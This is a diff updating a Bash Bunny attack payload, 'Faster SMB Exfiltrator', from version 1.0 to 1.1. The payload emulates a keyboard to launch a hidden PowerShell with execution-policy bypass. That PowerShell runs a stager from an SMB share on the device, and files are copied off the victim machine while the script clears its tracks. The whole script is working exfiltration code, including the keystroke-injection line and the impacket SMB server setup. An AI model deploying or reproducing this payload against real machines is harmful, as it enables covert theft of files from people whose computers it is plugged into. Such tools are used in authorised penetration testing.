@@ -3,11 +3,13 @@
 # Title:         Faster SMB Exfiltrator
 # Author:        Hak5Darren
 # Props:         ImNatho, mike111b, madbuda
-# Version:       1.0
+# Version:       1.1
 # Category:      Exfiltration
 # Target:        Windows XP SP3+ (Powershell)
 # Attackmodes:   HID, Ethernet
 #
+# CHANGELOG
+# =========
 # Rewrite of the original SMB Exfiltrator payload with:
 # - Faster copying, using robocopy multithreaded mode
 # - Faster finish, using a EXFILTRATION_COMPLETE file
@@ -15,31 +17,38 @@
 # - Clears tracks by default without second run dialog
 # - Test-Connection handling by ICMP (no lame sleeps)
 # - Hidden powershell window by default
-# 
-# LED Status
-# Red Blinking.........Failed to find dependencies
-# Purple Blinking......HID Stage
-# Purple...............Ethernet Stage
-# Blue/Purple..........Receiving Files
-# White................Moving Liberated Files
-# Green................Finished
 #
-# OPTIONS: configured from s.ps1
+# REQUIREMENTS
+# ============
+# Needs impacket to be copied to /tools/impacket and installed
+# Option A:
+#   1. Download impacket from https://github.com/CoreSecurity/impacket
+#   2. Copy impacket folder to /tools on the Bash Bunny flash drive
+#   3. Boot Bash Bunny into arming mode and connect to console via serial
+#   4. Issue "python /tools/impacket/setup.py install"
+# Option B:
+#   1. Download impacket deb package 
+#   2. Copy impacket.deb to /tools on the Bash Bunny flash drive
+#   3. Boot Bash Bunny into arming mode. Impacket will install automatically.
+# 
+# LED STATUS
+# ==========
+# FAIL........Failed to find dependencies
+# STAGE1......HID Stage
+# STAGE2......Ethernet Stage
+# SPECIAL.....Receiving Files
+# CLEANUP.....Moving Liberated Files
+# FINISH......Finished
+#
+# OPTIONS
+# =======
+# Exfiltration options configured from included s.ps1 script
 
 
 
 ######## INITIALIZATION ########
-# Check for impacket. If not found, blink fast red.
-if [ ! -d /pentest/impacket/ ]; then
-  LED R 100
-  exit 1
-fi
-
-
-
-######## SETUP ########
-# Get switch position from bunny helpers
-source bunny_helpers.sh
+REQUIRETOOL impacket
+GET SWITCH_POSITION
 # Make temporary loot directory
 mkdir -p /loot/smb/
 # Delete any old exfiltration data
@@ -55,29 +64,28 @@ echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all
 
 ######## HID STAGE ########
 # Runs hidden powershell which executes \\172.16.64.1\s\s.ps1 when available
-LED R B 500
+GET HOST_IP
+LED STAGE1
 ATTACKMODE HID
-QUACK GUI r
-QUACK DELAY 500
-QUACK STRING "powershell -WindowStyle Hidden -Exec Bypass \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1) { \\\172.16.64.1\s\s.ps1; exit } }\""
-QUACK ENTER
+RUN WIN "powershell -WindowStyle Hidden -Exec Bypass \"while (\$true) { If (Test-Connection $HOST_IP -count 1) { \\\\$HOST_IP\\s\\s.ps1; exit } }\""
 
 
 
 ######## ETHERNET STAGE ########
-LED R B
+LED STAGE2
 ATTACKMODE RNDIS_ETHERNET
 # Start the SMB Server
-/pentest/impacket/examples/smbserver.py -comment 'That Place Where I Put That Thing That Time' s /loot/smb >> /loot/smbserver.log &
+python /tools/impacket/examples/smbserver.py -comment 'That Place Where I Put That Thing That Time' s /loot/smb >> /loot/smbserver.log &
 # Re-enable ICMP/echo replies to trip the powershell stager
 echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
+LED B 100
 # Wait until files are done copying.
-while ! [ -f /loot/smb/EXFILTRATION_COMPLETE ]; do LED B; sleep 0.5; LED R B; sleep 0.5; done
+while ! [ -f /loot/smb/EXFILTRATION_COMPLETE ]; do sleep 1; done
 
 
 
 ######## CLEANUP ########
-LED R G B
+LED CLEANUP
 # Delete EXFILTRATION_COMPLETE file
 rm -rf /loot/smb/EXFILTRATION_COMPLETE
 # Move files to udisk loot directory
@@ -85,9 +93,9 @@ mv /loot/smb/e/* /root/udisk/loot/smb_exfiltrator
 # Clean up temporary loot directory
 rm -rf /loot/smb/e/*
 # Sync file system
-sync; sleep 1; sync
-
+sync
 
 
 ######## FINISH ########
-LED G # Trap is clean
+# Trap is clean
+LED FINISH
